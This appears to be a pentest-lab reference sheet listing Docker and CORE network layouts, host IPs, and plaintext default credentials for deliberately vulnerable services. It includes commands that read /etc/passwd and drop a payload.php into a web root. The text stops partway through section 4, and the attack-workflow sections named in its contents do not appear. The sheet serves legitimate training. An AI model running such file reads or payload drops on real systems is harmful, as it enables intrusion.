# Network and Environment Cheatsheet

**Skill Level**: All Levels [B/I/A]
**Last Updated**: January 2026

Comprehensive quick reference for Docker lab environment and CORE network topologies.

> **How to use this cheatsheet**: Use Ctrl+F to quickly find information. Tables are organized for rapid lookup during engagements. For detailed walkthroughs, see the training modules.

---

## Table of Contents

1. [Docker Environment Quick Reference](#1-docker-environment-quick-reference)
2. [CORE Network Quick Reference](#2-core-network-quick-reference)
3. [Network Topology Diagrams](#3-network-topology-diagrams)
4. [IP Address Reference](#4-ip-address-reference)
5. [Attack Surface Quick Reference](#5-attack-surface-quick-reference)
6. [Troubleshooting Commands](#6-troubleshooting-commands)
7. [Quick Attack Workflows](#7-quick-attack-workflows)

---

## 1. Docker Environment Quick Reference

### 1.1 Container Names and IP Addresses

#### DMZ Network (10.10.10.0/24)

| Container Name | Hostname | DMZ IP | Internal IP | Role |
|----------------|----------|--------|-------------|------|
| cptc11-vulnerable-web | vulnerable-web | 10.10.10.10 | 10.10.20.10 | Web Application |
| cptc11-ftp-server | ftp-server | 10.10.10.20 | - | FTP Server |
| cptc11-smtp-server | smtp-server | 10.10.10.30 | 10.10.20.30 | Mail Server |
| cptc11-dns-server | dns-server | 10.10.10.40 | 10.10.20.40 | DNS Server |
| cptc11-attack-platform | attacker | 10.10.10.100 | 10.10.20.100 | Attack Station |

#### Internal Network (10.10.20.0/24)

| Container Name | Hostname | Internal IP | Management IP | Role |
|----------------|----------|-------------|---------------|------|
| cptc11-smb-server | smb-server | 10.10.20.50 | - | File Share |
| cptc11-mysql-server | mysql-server | 10.10.20.60 | - | Database |
| cptc11-workstation-1 | ws01 | 10.10.20.101 | - | Workstation |
| cptc11-workstation-2 | ws02 | 10.10.20.102 | - | Workstation |
| cptc11-server-1 | srv01 | 10.10.20.111 | 10.10.30.111 | Linux Server |
| cptc11-dc | dc01 | 10.10.20.5 | 10.10.30.5 | Domain Controller |

#### Management Network (10.10.30.0/24) - Internal Only

| Container Name | Hostname | Management IP | Notes |
|----------------|----------|---------------|-------|
| cptc11-server-1 | srv01 | 10.10.30.111 | Dual-homed |
| cptc11-dc | dc01 | 10.10.30.5 | Dual-homed |

---

### 1.2 Port Mappings Table

| Host Port | Container | Internal Port | Service | Protocol |
|-----------|-----------|---------------|---------|----------|
| 8080 | vulnerable-web | 80 | HTTP | TCP |
| 8443 | vulnerable-web | 443 | HTTPS | TCP |
| 2121 | ftp-server | 21 | FTP | TCP |
| 30000-30009 | ftp-server | 30000-30009 | FTP Passive | TCP |
| 2525 | smtp-server | 25 | SMTP | TCP |
| 587 | smtp-server | 587 | SMTP Submission | TCP |
| 5353 | dns-server | 53 | DNS | UDP/TCP |
| 4445 | smb-server | 445 | SMB | TCP |
| 1139 | smb-server | 139 | NetBIOS | TCP |
| 3307 | mysql-server | 3306 | MySQL | TCP |
| 2222 | server-1 | 22 | SSH | TCP |

---

### 1.3 Service Credentials Table

#### Web Application Credentials

| Type | Username | Password | Access Level |
|------|----------|----------|--------------|
| HTTP Basic Auth | admin | admin123 | Admin |
| HTTP Basic Auth | testuser | testpass | User |
| Form Login | admin | admin123 | Admin |
| Form Login | user | password | User |
| Form Login | webmaster | webmaster1 | Webmaster |

#### FTP Server Credentials

| Username | Password | Notes |
|----------|----------|-------|
| ftpuser | ftppass123 | Standard user |
| admin | admin123 | Admin access |
| backup | backup2024 | Backup account |
| anonymous | (any) | Anonymous enabled |

#### SMTP Server Credentials

| Username | Password | Notes |
|----------|----------|-------|
| smtpuser | smtppass123 | Primary user |
| mailuser | mailpass456 | Secondary user |
| admin | admin123 | Admin |

#### SMB Server Credentials

| Username | Password | Shares Accessible |
|----------|----------|-------------------|
| smbuser | smbpass123 | public, private |
| admin | admin123 | All shares |
| backup | backup2024 | backup share |
| (null session) | - | public only |

#### MySQL Server Credentials

| Username | Password | Database | Privileges |
|----------|----------|----------|------------|
| root | rootpass123 | ALL | SUPER |
| webuser | webpass123 | webapp | SELECT, INSERT, UPDATE |

#### SSH/Server Credentials

| Host | Username | Password | Notes |
|------|----------|----------|-------|
| srv01 | admin | admin123 | Standard admin |
| srv01 | sysadmin | sysadmin1 | System admin |
| srv01 | root | r00t | Root access |

#### Domain Controller Credentials

| Username | Password | Role |
|----------|----------|------|
| Administrator | AdminPass123! | Domain Admin |
| Domain_Admin | DomAdmin2024 | Domain Admin |

---

### 1.4 docker-compose Commands

#### Basic Operations

```bash
# Navigate to docker directory
cd /Users/ic/cptc11/docker

# Start all services (detached)
docker-compose up -d

# Start specific service
docker-compose up -d vulnerable-web

# Stop all services
docker-compose down

# Stop and remove volumes (full reset)
docker-compose down -v

# Restart all services
docker-compose restart

# Restart specific service
docker-compose restart vulnerable-web
```

#### Status and Monitoring

```bash
# View running containers
docker-compose ps

# View all containers (including stopped)
docker-compose ps -a

# View logs (all services)
docker-compose logs

# Follow logs (live)
docker-compose logs -f

# Follow logs for specific service
docker-compose logs -f vulnerable-web

# View last 100 lines
docker-compose logs --tail=100
```

#### Building and Rebuilding

```bash
# Build all images
docker-compose build

# Build specific service
docker-compose build vulnerable-web

# Build without cache (clean rebuild)
docker-compose build --no-cache

# Build and start
docker-compose up -d --build

# Force recreate containers
docker-compose up -d --force-recreate
```

---

### 1.5 Container Management Commands

#### Accessing Containers

```bash
# Interactive shell (bash)
docker exec -it cptc11-vulnerable-web bash

# Interactive shell (sh fallback)
docker exec -it cptc11-vulnerable-web sh

# Run single command
docker exec cptc11-vulnerable-web cat /etc/passwd

# Access attack platform
docker exec -it cptc11-attack-platform bash
```

#### Container Information

```bash
# List all containers
docker ps -a

# List running containers only
docker ps

# Inspect container details
docker inspect cptc11-vulnerable-web

# View container IP addresses
docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cptc11-vulnerable-web

# View container resource usage
docker stats

# View container processes
docker top cptc11-vulnerable-web
```

#### Container Lifecycle

```bash
# Start stopped container
docker start cptc11-vulnerable-web

# Stop running container
docker stop cptc11-vulnerable-web

# Restart container
docker restart cptc11-vulnerable-web

# Pause container
docker pause cptc11-vulnerable-web

# Unpause container
docker unpause cptc11-vulnerable-web

# Kill container (force stop)
docker kill cptc11-vulnerable-web

# Remove container
docker rm cptc11-vulnerable-web
```

#### Container File Operations

```bash
# Copy file from container to host
docker cp cptc11-vulnerable-web:/etc/passwd ./passwd.txt

# Copy file from host to container
docker cp ./payload.php cptc11-vulnerable-web:/var/www/html/

# View file in container
docker exec cptc11-vulnerable-web cat /var/log/apache2/access.log
```

---

### 1.6 Network Inspection Commands

#### Docker Network Operations

```bash
# List all networks
docker network ls

# Inspect DMZ network
docker network inspect docker_dmz_network

# Inspect internal network
docker network inspect docker_internal_network

# Inspect management network
docker network inspect docker_management_network

# List containers on specific network
docker network inspect docker_dmz_network --format='{{range .Containers}}{{.Name}} {{.IPv4Address}}{{println}}{{end}}'
```

#### Network Diagnostics from Containers

```bash
# Ping test from attack platform
docker exec cptc11-attack-platform ping -c 3 10.10.10.10

# Traceroute
docker exec cptc11-attack-platform traceroute 10.10.20.60

# Port check with netcat
docker exec cptc11-attack-platform nc -zv 10.10.10.10 80

# DNS lookup
docker exec cptc11-attack-platform nslookup testlab.local 10.10.10.40

# ARP table
docker exec cptc11-attack-platform arp -a
```

#### Quick Network Summary

```bash
# Get all container IPs (one-liner)
docker ps -q | xargs -I {} docker inspect --format='{{.Name}} {{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' {}

# List networks with subnets
docker network ls --format "table {{.Name}}\t{{.Driver}}\t{{.Scope}}"

# Check port bindings
docker port cptc11-vulnerable-web
```

---

## 2. CORE Network Quick Reference

### 2.1 CORE Installation

```bash
# Ubuntu/Debian Installation
sudo apt-get update
sudo apt-get install core-network core-gui

# Or build from source
git clone https://github.com/coreemu/core.git
cd core
./bootstrap.sh
./configure
make
sudo make install

# Verify installation
core-gui --version
```

### 2.2 Topology Loading Commands

```bash
# Launch CORE GUI
core-gui

# Launch with specific topology
core-gui /Users/ic/cptc11/networks/corporate-network.imn

# Available topology files
/Users/ic/cptc11/networks/corporate-network.imn    # Corporate network
/Users/ic/cptc11/networks/small-business.imn       # Small business
/Users/ic/cptc11/networks/university-network.imn   # University network
/Users/ic/cptc11/networks/ics-network.imn          # Industrial control system
```

### 2.3 Node Management

#### GUI Operations

| Action | Method |
|--------|--------|
| Start Network | Click green "Start" button |
| Stop Network | Click red "Stop" button |
| Open Node Terminal | Right-click node > Open Terminal |
| Configure Node | Right-click node > Configure |
| Add Node | Drag from toolbar |
| Delete Node | Select + Delete key |

#### Command Line Operations

```bash
# List running sessions
core-cli session list

# Start session from file
core-cli session start -f corporate-network.imn

# Stop specific session
core-cli session stop <session-id>

# Execute command on node
core-cli node command <session-id> <node-id> "ifconfig"

# Open shell to node
core-cli node shell <session-id> <node-id>
```

### 2.4 Service Start/Stop Commands

#### Starting Services on Nodes

```bash
# From node terminal - HTTP Server
cd /var/www/html && python3 -m http.server 80

# FTP Server
/Users/ic/cptc11/networks/services/ftp-service.sh 21 /var/ftp

# SSH Server
/Users/ic/cptc11/networks/services/ssh-service.sh 22

# SMB Server
/Users/ic/cptc11/networks/services/smb-service.sh /share

# MySQL Server
/Users/ic/cptc11/networks/services/mysql-service.sh 3306

# DNS Server
/Users/ic/cptc11/networks/services/dns-service.sh testlab.local 53

# SMTP Server
/Users/ic/cptc11/networks/services/smtp-service.sh 25 mail.testlab.local

# Modbus/ICS Service
/Users/ic/cptc11/networks/services/modbus-service.sh 502 plc
```

#### Making Services Executable

```bash
# Set permissions for all service scripts
chmod +x /Users/ic/cptc11/networks/services/*.sh
```

### 2.5 Traffic Capture Commands

```bash
# From node terminal - capture all traffic
tcpdump -i eth0 -w capture.pcap

# Capture specific port
tcpdump -i eth0 port 80 -w http_traffic.pcap

# Capture specific host
tcpdump -i eth0 host 10.100.1.10 -w host_traffic.pcap

# Live capture with output
tcpdump -i eth0 -n -v

# Capture only TCP SYN packets (scan detection)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Capture ICMP only
tcpdump -i eth0 icmp -w icmp_traffic.pcap
```

---

## 3. Network Topology Diagrams

### 3.1 Docker Lab Environment

```
================================================================================
                         DOCKER LAB ENVIRONMENT
================================================================================

                              INTERNET
                                 |
                    +------------+------------+
                    |      HOST MACHINE       |
                    |    (Port Forwarding)    |
                    +------------+------------+
                                 |
       +-------------------------+-------------------------+
       |                         |                         |
+------+-------+         +-------+-------+         +-------+-------+
|  DMZ NETWORK |         |INTERNAL NETWORK|        |  MANAGEMENT   |
| 10.10.10.0/24|         | 10.10.20.0/24 |        |    NETWORK    |
|   Gateway:   |         |    Gateway:   |        | 10.10.30.0/24 |
|  10.10.10.1  |         |   10.10.20.1  |        |  (Internal)   |
+--------------+         +---------------+        +---------------+

================================================================================
                              DMZ NETWORK
================================================================================

                 +------------------------------------------+
                 |           DMZ: 10.10.10.0/24             |
                 +------------------------------------------+
                 |                                          |
  +--------------+     +--------------+     +--------------+
  | VULNERABLE   |     |  FTP-SERVER  |     | SMTP-SERVER  |
  |    WEB       |     |              |     |              |
  +--------------+     +--------------+     +--------------+
  | 10.10.10.10  |     | 10.10.10.20  |     | 10.10.10.30  |
  | Ports:       |     | Ports:       |     | Ports:       |
  |  8080->80    |     |  2121->21    |     |  2525->25    |
  |  8443->443   |     | 30000-30009  |     |  587->587    |
  +--------------+     +--------------+     +--------------+
         |
         |             +--------------+     +--------------+
         +------------>|  DNS-SERVER  |     |   ATTACK     |
                       |              |     |  PLATFORM    |
                       +--------------+     +--------------+
                       | 10.10.10.40  |     | 10.10.10.100 |
                       | Ports:       |     | Tools:       |
                       |  5353->53    |     |  /opt/tools  |
                       +--------------+     +--------------+

================================================================================
                           INTERNAL NETWORK
================================================================================

                 +------------------------------------------+
                 |        Internal: 10.10.20.0/24           |
                 +------------------------------------------+
                 |                                          |
  +--------------+     +--------------+     +--------------+
  | SMB-SERVER   |     |MYSQL-SERVER  |     |    DC01      |
  |              |     |              |     |  (Domain     |
  +--------------+     +--------------+     |  Controller) |
  | 10.10.20.50  |     | 10.10.20.60  |     +--------------+
  | Ports:       |     | Ports:       |     | 10.10.20.5   |
  |  4445->445   |     |  3307->3306  |     | Also on Mgmt |
  |  1139->139   |     |              |     | 10.10.30.5   |
  +--------------+     +--------------+     +--------------+

  +--------------+     +--------------+     +--------------+
  |WORKSTATION-1 |     |WORKSTATION-2 |     |  SERVER-1    |
  |    (WS01)    |     |    (WS02)    |     |   (SRV01)    |
  +--------------+     +--------------+     +--------------+
  | 10.10.20.101 |     | 10.10.20.102 |     | 10.10.20.111 |
  |              |     |              |     | Port: 2222   |
  |              |     |              |     | Also on Mgmt |
  |              |     |              |     | 10.10.30.111 |
  +--------------+     +--------------+     +--------------+

  +--------------+
  |ATTACK PLATFORM
  | (Internal)   |
  +--------------+
  | 10.10.20.100 |
  +--------------+

================================================================================
                     MULTI-HOMED SERVICES
================================================================================

  Service          DMZ IP          Internal IP     Management IP
  -----------      ----------      -----------     -------------
  vulnerable-web   10.10.10.10     10.10.20.10     -
  smtp-server      10.10.10.30     10.10.20.30     -
  dns-server       10.10.10.40     10.10.20.40     -
  attack-platform  10.10.10.100    10.10.20.100    -
  server-1         -               10.10.20.111    10.10.30.111
  dc01             -               10.10.20.5      10.10.30.5

================================================================================
```

---

### 3.2 Corporate Network Layout (CORE)

```
================================================================================
                        CORPORATE NETWORK TOPOLOGY
                          corporate-network.imn
================================================================================

                           [ISP Router]
                           203.0.113.254
                                 |
                                 |
                           203.0.113.1
                        +----------------+
                        |  fw-external   |
                        |  (Firewall)    |
                        +----------------+
                       /        |        \
                      /         |         \
                     /          |          \
            10.100.1.1    10.100.2.1    10.100.3.1
                 |              |              |
         +-------+      +-------+      +-------+
         |              |              |
    +----+----+    +----+----+    +----+----+
    | sw-dmz  |    |sw-internal   |sw-database
    +---------+    +---------+    +---------+
       |   |          |  |  |        |     |
       |   |          |  |  |        |     |
       v   v          v  v  v        v     v

+----------+ +----------+  +------+ +------+ +------+  +--------+ +----------+
|web-server| |mail-server| | ws-1 | | ws-2 | | ws-3 |  |db-server |backup-srv|
+----------+ +----------+  +------+ +------+ +------+  +--------+ +----------+
|10.100.1.10 |10.100.1.20| |.2.10 | |.2.11 | |.2.12 |  |.3.10   | |.3.20    |
|HTTP:80,443 |SMTP:25    | |SSH:22| |SSH:22| |SSH:22|  |MySQL   | |FTP:21   |
+----------+ +----------+  +------+ +------+ +------+  |:3306   | |SSH:22   |
                                                       +--------+ +----------+

================================================================================
                         NETWORK SEGMENTS
================================================================================

  +-------------------------------------------------------------------+
  |    EXTERNAL                                                       |
  |    Subnet: 203.0.113.0/24                                         |
  |    Purpose: Internet-facing                                       |
  +-------------------------------------------------------------------+
                                   |
                                   v
  +-------------------------------------------------------------------+
  |    DMZ (10.100.1.0/24)                                 [RED ZONE] |
  |    Gateway: 10.100.1.1                                            |
  |    +---------------+  +---------------+                           |
  |    | web-server    |  | mail-server   |                           |
  |    | 10.100.1.10   |  | 10.100.1.20   |                           |
  |    | HTTP/HTTPS    |  | SMTP          |                           |
  |    +---------------+  +---------------+                           |
  +-------------------------------------------------------------------+
                                   |
                                   v
  +-------------------------------------------------------------------+
  |    INTERNAL (10.100.2.0/24)                          [GREEN ZONE] |
  |    Gateway: 10.100.2.1                                            |
  |    +------------+ +------------+ +------------+                   |
  |    |workstation1| |workstation2| |workstation3|                   |
  |    |10.100.2.10 | |10.100.2.11 | |10.100.2.12 |                   |
  |    +------------+ +------------+ +------------+                   |
  +-------------------------------------------------------------------+
                                   |
                                   v
  +-------------------------------------------------------------------+
  |    DATABASE (10.100.3.0/24)                           [BLUE ZONE] |
  |    Gateway: 10.100.3.1                                            |
  |    +---------------+  +---------------+                           |
  |    | db-server     |  | backup-server |                           |
  |    | 10.100.3.10   |  | 10.100.3.20   |                           |
  |    | MySQL:3306    |  | FTP:21, SSH   |                           |
  |    +---------------+  +---------------+                           |
  +-------------------------------------------------------------------+

================================================================================
                         FIREWALL RULES
================================================================================

  Source          Destination     Ports           Action
  --------        -----------     -----           ------
  External        DMZ             80,443,25       ACCEPT
  DMZ             Internal        -               DROP (default)
  DMZ             Database        3306            ACCEPT
  Internal        DMZ             ANY             ACCEPT
  Internal        Database        ANY             ACCEPT
  ANY             ANY             -               DROP

================================================================================
```

---

### 3.3 Small Business Layout (CORE)

```
================================================================================
                       SMALL BUSINESS NETWORK
                         small-business.imn
================================================================================

                           [ISP Gateway]
                           192.168.100.1
                                 |
                                 |
                             10.0.0.1
                        +----------------+
                        |   fw-router    |
                        | (Router/FW)    |
                        +----------------+
                                 |
                                 |
                        +----------------+
                        |  main-switch   |
                        +----------------+
                  ______|________|________|________
                 /      |        |        |        \
                /       |        |        |         \
               v        v        v        v          v

         +--------+ +--------+ +--------+        +----------------+
         | file-  | | print- | |  NAS   |        |  Workstations  |
         | server | | server | | backup |        |    (x7)        |
         +--------+ +--------+ +--------+        +----------------+
         |10.0.0.10 |10.0.0.11 |10.0.0.12        | 10.0.0.20-26   |
         |SMB:     | |CUPS:631| |FTP:21  |        |                |
         |139,445  | |        | |HTTP:5000        |                |
         +--------+ +--------+ +--------+        +----------------+

================================================================================
                         FLAT NETWORK
================================================================================

  +-------------------------------------------------------------------+
  |    NETWORK: 10.0.0.0/24 (FLAT)                                    |
  |    Gateway: 10.0.0.1                                              |
  +-------------------------------------------------------------------+
  |                                                                   |
  |    SERVERS:                                                       |
  |    +---------------+  +---------------+  +---------------+        |
  |    | file-server   |  | print-server  |  | nas-backup    |        |
  |    | 10.0.0.10     |  | 10.0.0.11     |  | 10.0.0.12     |        |
  |    | SMB: 139,445  |  | CUPS: 631     |  | FTP:21, HTTP:5k       |
  |    +---------------+  +---------------+  +---------------+        |
  |                                                                   |
  |    WORKSTATIONS:                                                  |
  |    +------------+ +---------------+ +------------+                |
  |    |ws-reception| |ws-accounting-1| |ws-accounting-2             |
  |    | 10.0.0.20  | | 10.0.0.21     | | 10.0.0.22  |                |
  |    +------------+ +---------------+ +------------+                |
  |                                                                   |
  |    +------------+ +------------+ +------------+ +-------------+   |
  |    | ws-manager | | ws-sales-1 | | ws-sales-2 | | ws-warehouse|   |
  |    | 10.0.0.23  | | 10.0.0.24  | | 10.0.0.25  | | 10.0.0.26   |   |
  |    | SSH:22     | |            | |            | |             |   |
  |    +------------+ +------------+ +------------+ +-------------+   |
  |                                                                   |
  +-------------------------------------------------------------------+

================================================================================
                         HOST INVENTORY
================================================================================

  Host              IP Address      Services              Notes
  ----              ----------      --------              -----
  file-server       10.0.0.10       SMB (139, 445)        Sensitive data
  print-server      10.0.0.11       CUPS (631)            Admin interface
  nas-backup        10.0.0.12       FTP (21), HTTP (5000) Default creds
  ws-reception      10.0.0.20       -                     No services
  ws-accounting-1   10.0.0.21       SSH (22)              Finance data
  ws-accounting-2   10.0.0.22       SSH (22)              Finance data
  ws-manager        10.0.0.23       SSH (22)              Admin access
  ws-sales-1        10.0.0.24       -                     No services
  ws-sales-2        10.0.0.25       -                     No services
  ws-warehouse      10.0.0.26       -                     No services

================================================================================
```

---

### 3.4 University Network Layout (CORE)

```
================================================================================
                        UNIVERSITY NETWORK
                       university-network.imn
================================================================================

                           [ISP Border]
                           198.51.100.2
                                 |
                                 |
                        +----------------+
                        |  core-router   |
                        +----------------+
                       /    |    |       \
                      /     |    |        \
               172.16.1.x 172.16.2.x 172.16.3.x 172.16.4.x
                    |       |       |         |
            +-------+  +----+  +----+    +----+
            |          |       |         |
    +-------+------+   |       |    +----+--------+
    |router-student|   |       |    |router-servers
    +--------------+   |       |    +-------------+
           |           |       |           |
    +------+------+    |       |    +------+------+
    | sw-student  |    |       |    | sw-servers  |
    +-------------+    |       |    +-------------+
      /   |   \        |       |     / | | | \
     /    |    \       |       |    /  | | |  \
    v     v     v      |       |   v   v v v   v

  +----+ +----+ +----+ | +--+ +--+ | +---+ +---+ +----+ +---+ +----+
  |PC1 | |PC2 | |... | | |PC| |PC| | |web| |db | |ldap| |dns| |mail|
  +----+ +----+ +----+ | +--+ +--+ | +---+ +---+ +----+ +---+ +----+
                       |           |
               +-------+------+    +-------+------+
               |router-faculty|    |router-guest  |
               +--------------+    +--------------+
                      |                   |
               +------+------+     +------+------+
               | sw-faculty  |     |  sw-guest   |
               +-------------+     +-------------+
                  /     \             /     \
                 v       v           v       v

================================================================================
                         NETWORK SEGMENTS
================================================================================

  Segment          Subnet              Gateway          Purpose
  -------          ------              -------          -------
  Core             172.16.0.0/24       172.16.0.1       Backbone routing
  Student          172.16.10.0/24      172.16.10.1      Student computers
  Faculty          172.16.20.0/24      172.16.20.1      Faculty/staff
  Guest WiFi       172.16.30.0/24      172.16.30.1      Guest wireless
  Server Farm      172.16.40.0/24      172.16.40.1      Central services

================================================================================
                         SERVER FARM DETAIL
================================================================================

  +-------------------------------------------------------------------+
  |    SERVER FARM (172.16.40.0/24)                                   |
  +-------------------------------------------------------------------+
  |                                                                   |
  |  +------------+  +------------+  +------------+  +------------+   |
  |  | dns-server |  | web-portal |  | db-server  |  |ldap-server |   |
  |  |172.16.40.5 |  |172.16.40.10|  |172.16.40.20|  |172.16.40.30|   |
  |  | DNS:53     |  | HTTP:80,443|  | MySQL:3306 |  |LDAP:389,636|   |
  |  +------------+  +------------+  +------------+  +------------+   |
  |                                                                   |
  |  +------------+                                                   |
  |  |mail-server |                                                   |
  |  |172.16.40.40|                                                   |
  |  |SMTP:25     |                                                   |
  |  |IMAP:143    |                                                   |
  |  +------------+                                                   |
  |                                                                   |
  +-------------------------------------------------------------------+

================================================================================
                         KEY HOSTS TABLE
================================================================================

  Host            IP Address      Services                 Vulnerabilities
  ----            ----------      --------                 ---------------
  web-portal      172.16.40.10    HTTP (80, 443)           Hardcoded creds
  db-server       172.16.40.20    MySQL (3306)             Weak passwords
  ldap-server     172.16.40.30    LDAP (389, 636)          Enumeration
  dns-server      172.16.40.5     DNS (53)                 Zone transfer
  mail-server     172.16.40.40    SMTP (25), IMAP (143)    Relay abuse

================================================================================
```

---

### 3.5 ICS Network Layout (CORE)

```
================================================================================
                     INDUSTRIAL CONTROL SYSTEM NETWORK
                            ics-network.imn
================================================================================

      +-------------------------------------------------------------------+
      |                     CORPORATE IT NETWORK                         |
      |                        10.0.0.0/24                                |
      +-------------------------------------------------------------------+
                                   |
                                   v
                          +----------------+
                          | fw-corporate   |
                          +----------------+
                                   |
                              192.168.1.x
                                   |
                          +----------------+
                          |   fw-dmz       |
                          +----------------+
                          /                \
                         /                  \
                        v                    v
         +-----------------+          +-------------------+
         | DMZ/CONTROL     |          |   OT NETWORK      |
         | 192.168.1.0/24  |          | 192.168.100.0/24  |
         +-----------------+          +-------------------+

================================================================================
                         DMZ/CONTROL CENTER
================================================================================

  +-------------------------------------------------------------------+
  |    CONTROL CENTER DMZ (192.168.1.0/24)                            |
  +-------------------------------------------------------------------+
  |                                                                   |
  |  +------------+  +------------+  +-------------+  +------------+  |
  |  | historian  |  | hmi-server |  |eng-workstation| jump-server|  |
  |  |192.168.1.10|  |192.168.1.20|  |192.168.1.50 |  |192.168.1.100|
  |  | HTTP:80    |  | HTTP:80    |  | SSH:22      |  | SSH:22     |  |
  |  | PI SDK:5450|  | VNC:5900   |  |             |  | RDP:3389   |  |
  |  +------------+  +------------+  +-------------+  +------------+  |
  |                                                                   |
  +-------------------------------------------------------------------+

================================================================================
                         OT NETWORK (OPERATIONAL TECHNOLOGY)
================================================================================

  +-------------------------------------------------------------------+
  |    OT NETWORK (192.168.100.0/24)                                  |
  +-------------------------------------------------------------------+
  |                                                                   |
  |                       +---------------+                           |
  |                       | sw-ot         |                           |
  |                       +---------------+                           |
  |                      /   |    |    |   \                          |
  |                     /    |    |    |    \                         |
  |                    v     v    v    v     v                        |
  |                                                                   |
  |  +------------+ +------+ +------+ +------+ +------------+         |
  |  |scada-master| | plc-1| | plc-2| | rtu-1| | field-hmi  |         |
  |  |192.168.    | |192.  | |192.  | |192.  | |192.168.    |         |
  |  |100.10      | |168.  | |168.  | |168.  | |100.40      |         |
  |  |Modbus:502  | |100.20| |100.21| |100.30| |HTTP:80     |         |
  |  |DNP3:20000  | |Modbus| |Modbus| |Modbus| |VNC:5900    |         |
  |  +------------+ |S7:102| |E/IP: | |DNP3  | +------------+         |
  |                 +------+ |44818 | +------+                        |
  |                          +------+                                 |
  +-------------------------------------------------------------------+

================================================================================
                         AIR-GAPPED SAFETY NETWORK
================================================================================

  +-------------------------------------------------------------------+
  |    SAFETY NETWORK (192.168.200.0/24) - AIR-GAPPED                 |
  +-------------------------------------------------------------------+
  |                                                                   |
  |                       +---------------+                           |
  |                       | sw-airgap     |                           |
  |                       +---------------+                           |
  |                          /        \                               |
  |                         /          \                              |
  |                        v            v                             |
  |                                                                   |
  |                +------------+  +------------+                     |
  |                | safety-plc |  | safety-hmi |                     |
  |                |192.168.    |  |192.168.    |                     |
  |                |200.10      |  |200.20      |                     |
  |                |Modbus:502  |  |            |                     |
  |                +------------+  +------------+                     |
  |                                                                   |
  |    [!] This network is physically isolated (air-gapped)           |
  |                                                                   |
  +-------------------------------------------------------------------+

================================================================================
                         ICS PROTOCOL REFERENCE
================================================================================

  Protocol        Port        Description                  Auth Required
  --------        ----        -----------                  -------------
  Modbus TCP      502         Industrial automation        NO
  DNP3            20000       SCADA communications         NO
  S7comm          102         Siemens S7 PLCs              NO
  EtherNet/IP     44818       Allen-Bradley/Rockwell       NO
  OPC UA          4840        Unified Architecture         Optional
  BACnet          47808       Building automation          NO

================================================================================
                         ICS HOST INVENTORY
================================================================================

  Host              IP Address       Services              Notes
  ----              ----------       --------              -----
  historian         192.168.1.10     HTTP:80, PI:5450      Process data
  hmi-server        192.168.1.20     HTTP:80, VNC:5900     No VNC auth
  eng-workstation   192.168.1.50     SSH:22                Pivot point
  jump-server       192.168.1.100    SSH:22, RDP:3389      Gateway
  scada-master      192.168.100.10   Modbus:502, DNP3      Main controller
  plc-1             192.168.100.20   Modbus:502, S7:102    Siemens PLC
  plc-2             192.168.100.21   Modbus:502, E/IP      Allen-Bradley
  rtu-1             192.168.100.30   Modbus:502, DNP3      Remote terminal
  field-hmi         192.168.100.40   HTTP:80, VNC:5900     Default creds
  safety-plc        192.168.200.10   Modbus:502            Air-gapped

================================================================================
```

---

## 4. IP Address Reference

### 4.1 Docker Environment Subnet Allocations

| Network | Subnet | Gateway | Type | Purpose |
|---------|--------|---------|------|---------|
| DMZ | 10.10.10.0/24 | 10.10.10.1 | Bridge | External-facing services |
| Internal | 10.10.20.0/24 | 10.10.20.1 | Bridge | Corporate network |
| Management | 10.10.30.0/24 | 10.10.30.1 | Internal | Restricted access |

### 4.2 CORE Network Subnet Allocations

#### Corporate Network

| Segment | Subnet | Gateway | VLAN | Purpose |
|---------|--------|---------|------|---------|
| External | 203.0.113.0/24 | 203.0.113.254 | - | Internet |
| DMZ | 10.100.1.0/24 | 10.100.1.1 | 10 | Public servers |
| Internal | 10.100.2.0/24 | 10.100.2.1 | 20 | Workstations |
| Database | 10.100.3.0/24 | 10.100.3.1 | 30 | Backend |

#### Small Business Network

| Segment | Subnet | Gateway | Notes |
|---------|--------|---------|-------|
| External | 192.168.100.0/24 | 192.168.100.1 | ISP provided |
| Internal | 10.0.0.0/24 | 10.0.0.1 | Flat network |

#### University Network

| Segment | Subnet | Gateway | VLAN | Purpose |
|---------|--------|---------|------|---------|
| Core | 172.16.0.0/24 | 172.16.0.1 | 1 | Backbone |
| Student | 172.16.10.0/24 | 172.16.10.1 | 10 | Student PCs |
| Faculty | 172.16.20.0/24 | 172.16.20.1 | 20 | Staff |
| Guest | 172.16.30.0/24 | 172.16.30.1 | 30 | WiFi |
| Servers | 172.16.40.0/24 | 172.16.40.1 | 40 | Services |

#### ICS Network

| Segment | Subnet | Gateway | Zone | Purpose |
|---------|--------|---------|------|---------|
| Corporate | 10.0.0.0/24 | 10.0.0.1 | IT | Business |
| Control DMZ | 192.168.1.0/24 | 192.168.1.1 | DMZ | Control center |
| OT Network | 192.168.100.0/24 | 192.168.100.1 | OT | Operations |
| Safety | 192.168.200.0/24 | 192.168.200.1 | Safety | Air-gapped |

---

### 4.3 Service IPs per Topology

#### Docker Lab - All Service IPs

| Service | DMZ IP | Internal IP | Mgmt IP | Primary Port |
|---------|--------|-------------|---------|--------------|
| Web App | 10.10.10.10 | 10.10.20.10 | - | 80/443 |
| FTP | 10.10.10.20 | - | - | 21 |
| SMTP | 10.10.10.30 | 10.10.20.30 | - | 25 |
| DNS | 10.10.10.40 | 10.10.20.40 | - | 53 |
| SMB | - | 10.10.20.50 | - | 445 |
| MySQL | - | 10.10.20.60 | - | 3306 |
| WS01 | - | 10.10.20.101 | - | - |
| WS02 | - | 10.10.20.102 | - | - |
| SRV01 | - | 10.10.20.111 | 10.10.30.111 | 22 |
| DC01 | - | 10.10.20.5 | 10.10.30.5 | - |
| Attacker | 10.10.10.100 | 10.10.20.100 | - | - |

#### Corporate Network - Service IPs

| Service | IP Address | Services | Segment |
|---------|------------|----------|---------|
| ISP Router | 203.0.113.254 | Routing | External |
| Firewall | 203.0.113.1 | FW | External |
| Web Server | 10.100.1.10 | HTTP:80,443 | DMZ |
| Mail Server | 10.100.1.20 | SMTP:25 | DMZ |
| Workstation 1 | 10.100.2.10 | SSH:22 | Internal |
| Workstation 2 | 10.100.2.11 | SSH:22 | Internal |
| Workstation 3 | 10.100.2.12 | SSH:22 | Internal |
| DB Server | 10.100.3.10 | MySQL:3306 | Database |
| Backup Server | 10.100.3.20 | FTP:21, SSH:22 | Database |

#### University Network - Service IPs

| Service | IP Address | Services | Segment |
|---------|------------|----------|---------|
| DNS Server | 172.16.40.5 | DNS:53 | Servers |
